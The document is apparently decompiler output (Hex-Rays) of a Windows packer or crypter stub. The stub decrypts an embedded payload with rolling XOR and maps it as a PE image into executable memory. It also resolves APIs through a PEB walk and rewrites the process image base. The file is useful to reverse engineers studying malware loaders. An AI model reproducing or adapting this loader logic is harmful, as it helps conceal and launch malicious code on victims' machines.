/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

void start();
void __noreturn sub_401090(); // weak
void __cdecl __noreturn sub_4010DA(_BYTE *, int);
void sub_40111F();
_BYTE *sub_40112A();
int sub_40119D();
void sub_401221();
void sub_40122C();
_BYTE *__stdcall sub_401240(_BYTE *, _BYTE *, int);
DWORD sub_401263();
void __noreturn sub_40128D(); // weak
int (__stdcall *sub_401295())(_DWORD, _DWORD);
int (__stdcall *sub_4012E9())(_DWORD);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *CancelDeviceWakeupRequest)(HANDLE hDevice);
// extern BOOL (__stdcall *CancelIo)(HANDLE hFile);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern DWORD (__stdcall *GetLastError)();
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
int dword_402000; // weak
int dword_402008; // weak
int dword_402120; // weak
int (__stdcall *dword_40213C)(_DWORD); // weak
int (__stdcall *dword_402144)(_DWORD, _DWORD); // weak
int dword_402148; // weak


//----- (00401030) --------------------------------------------------------
void start()
{
  DWORD v0; // eax

  v0 = sub_401263();
  ((void (*)(void))(v0 - 7 + 4198537))();
  sub_40112A();
  sub_401221();
}

//----- (00401090) --------------------------------------------------------
void __noreturn sub_401090()
{
  DWORD flOldProtect; // [esp+0h] [ebp-4h] BYREF

  dword_402000 = *(_DWORD *)(((unsigned int)sub_401090 & 0xFFFF0000) + 0x7074);
  dword_402008 = ((unsigned int)sub_401090 & 0xFFFF0000) + 28808;
  VirtualProtect((LPVOID)(((unsigned int)sub_401090 & 0xFFFF0000) + 28808), dword_402000, 4u, &flOldProtect);
  sub_4010DA((_BYTE *)dword_402008, dword_402000);
}
// 401090: using guessed type void __noreturn sub_401090();
// 402000: using guessed type int dword_402000;
// 402008: using guessed type int dword_402008;

//----- (004010DA) --------------------------------------------------------
void __cdecl __noreturn sub_4010DA(_BYTE *a1, int a2)
{
  char v2; // bl
  char v3; // cl
  char v4; // dl

  v2 = sub_401263() - 119;
  while ( 1 )
  {
    *a1 ^= v2;
    v2 += 21;
    sub_40111F();
    *a1 ^= v3;
    sub_40111F();
    *a1 ^= v4;
    sub_40111F();
  }
}
// 401105: variable 'v3' is possibly undefined
// 40110F: variable 'v4' is possibly undefined

//----- (0040111F) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void sub_40111F()
{
  ;
}
// 40111C: positive sp value 8 has been found
// 40111F: could not find valid save-restore pair for ebp

//----- (0040112A) --------------------------------------------------------
_BYTE *sub_40112A()
{
  int v0; // ebx
  _BYTE *v1; // esi
  _DWORD *v2; // edi
  int v4; // [esp+10h] [ebp-4h]

  v0 = *(_DWORD *)(dword_402008 + 60) + dword_402008;
  dword_402120 = *(_DWORD *)(v0 + 52);
  v4 = *(unsigned __int8 *)(v0 + 6);
  v1 = VirtualAlloc(*(LPVOID *)(v0 + 52), *(_DWORD *)(v0 + 80), 0x3000u, 0x40u);
  sub_401240(v1, (_BYTE *)dword_402008, *(_DWORD *)(v0 + 84));
  v2 = (_DWORD *)(v0 + 248);
  do
  {
    sub_401240(&v1[v2[3]], (_BYTE *)(v2[5] + dword_402008), v2[4]);
    v2 += 10;
    --v4;
  }
  while ( v4 );
  return &v1[*(_DWORD *)(v0 + 40)];
}
// 402008: using guessed type int dword_402008;
// 402120: using guessed type int dword_402120;

//----- (0040119D) --------------------------------------------------------
int sub_40119D()
{
  _DWORD *v0; // ebx
  int v1; // esi
  _DWORD *v2; // edi
  int v3; // ecx
  int v4; // ecx
  int v6; // [esp+0h] [ebp-4h]

  sub_4012E9();
  v0 = (_DWORD *)(dword_402120 + *(_DWORD *)(dword_402120 + *(_DWORD *)(dword_402120 + 60) + 128));
  do
  {
    v6 = dword_40213C(dword_402120 + v0[3]);
    v1 = dword_402120 + *v0;
    v2 = (_DWORD *)(dword_402120 + v0[4]);
    do
    {
      v3 = *(_DWORD *)v1;
      if ( *(_BYTE *)(v1 + 3) == 0x80 )
        v4 = v3 & 0x7FFFFFFF;
      else
        v4 = dword_402120 + v3 + 2;
      *v2++ = dword_402144(v6, v4);
      v1 += 4;
    }
    while ( *(_DWORD *)v1 );
    v0 += 5;
  }
  while ( v0[3] );
  return 0;
}
// 402120: using guessed type int dword_402120;
// 40213C: using guessed type int (__stdcall *dword_40213C)(_DWORD);
// 402144: using guessed type int (__stdcall *dword_402144)(_DWORD, _DWORD);

//----- (00401221) --------------------------------------------------------
void sub_401221()
{
  sub_40119D();
  sub_40122C();
}

//----- (0040122C) --------------------------------------------------------
void sub_40122C()
{
  NtCurrentTeb()->ProcessEnvironmentBlock->ImageBaseAddress = (void *)dword_402120;
}
// 402120: using guessed type int dword_402120;

//----- (00401240) --------------------------------------------------------
_BYTE *__stdcall sub_401240(_BYTE *a1, _BYTE *a2, int a3)
{
  _BYTE *result; // eax
  int i; // ecx

  result = a2;
  for ( i = a3; i; --i )
    *a1++ = *result++;
  return result;
}

//----- (00401263) --------------------------------------------------------
DWORD sub_401263()
{
  DWORD v0; // esi
  void *savedregs; // [esp+0h] [ebp+0h]
  HANDLE savedregsa; // [esp+0h] [ebp+0h]

  CancelDeviceWakeupRequest(savedregs);
  v0 = 8 * GetLastError();
  CancelIo(savedregsa);
  return v0 + GetLastError();
}
// 401267: variable 'savedregs' is possibly undefined
// 40127A: variable 'savedregsa' is possibly undefined

//----- (0040128D) --------------------------------------------------------
void __noreturn sub_40128D()
{
  ExitProcess(0);
}
// 40128D: using guessed type void __noreturn sub_40128D();

//----- (00401295) --------------------------------------------------------
int (__stdcall *sub_401295())(_DWORD, _DWORD)
{
  int v0; // eax
  int i; // ecx
  int (__stdcall *result)(_DWORD, _DWORD); // eax

  dword_402148 = (int)NtCurrentPeb()->Ldr->InInitializationOrderModuleList.Flink->Flink[1].Flink;
  v0 = dword_402148 + *(_DWORD *)(dword_402148 + *(_DWORD *)(dword_402148 + 60) + 120);
  for ( i = 0; *(_DWORD *)(dword_402148 + *(_DWORD *)(dword_402148 + *(_DWORD *)(v0 + 32) + 4 * i) + 4) != 1097035634; ++i )
    ;
  result = (int (__stdcall *)(_DWORD, _DWORD))(dword_402148 + *(_DWORD *)(dword_402148 + *(_DWORD *)(v0 + 28) + 4 * i));
  dword_402144 = result;
  return result;
}
// 402144: using guessed type int (__stdcall *dword_402144)(_DWORD, _DWORD);
// 402148: using guessed type int dword_402148;

//----- (004012E9) --------------------------------------------------------
int (__stdcall *sub_4012E9())(_DWORD)
{
  int (__stdcall *result)(_DWORD); // eax

  sub_401295();
  result = (int (__stdcall *)(_DWORD))dword_402144(dword_402148, "LoadLibraryA");
  dword_40213C = result;
  return result;
}
// 40213C: using guessed type int (__stdcall *dword_40213C)(_DWORD);
// 402144: using guessed type int (__stdcall *dword_402144)(_DWORD, _DWORD);
// 402148: using guessed type int dword_402148;

// nfuncs=13 queued=13 decompiled=13 lumina nreq=0 worse=0 better=0
// ALL OK, 13 function(s) have been successfully decompiled
